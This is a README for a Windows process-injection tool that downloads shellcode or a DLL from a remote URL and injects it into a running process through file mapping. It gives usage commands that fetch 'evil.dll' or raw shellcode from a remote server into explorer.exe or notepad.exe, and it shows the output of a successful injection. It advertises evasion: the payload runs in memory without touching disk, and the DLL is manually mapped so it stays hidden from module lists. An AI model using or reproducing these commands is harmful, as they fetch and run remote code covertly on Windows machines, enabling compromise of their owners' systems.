# memloader_inj-win
Inject remote shellcode or DLL file into process memory using FileMapping

DLL injection technique does not make use of the file map object at this time.

## Usage
``` ./memloader_inj-win.exe [process name] [url] ```

## Example
Raw shellcode is hosted on 127.0.0.1:8000 in a file named shellcode
``` ./memloader_inj-win.exe explorer.exe http://127.0.0.1:8000/shellcode ```

Payload is stored on remote linux server http server. 
The payload is downloaded to memory and injected into target process without touching disk!
The DLL is manually mapped so it will not appear in loaded Modules
``` ./memloader_inj-win.exe notepad.exe http://linux.host/evil.dll ```

Output:

```
Opening Process: notepad.exe with PID 34368 for injection
Downloading File...
Start address: 000001D475C70000
Parameters address: 000001D475C60000
Injected into process!
```


[Demo (YouTube)](https://youtu.be/6XtGsxcnGRs)

## Building

Open solution in Visual Studio. Must be built in release mode for stub builder to work properly.
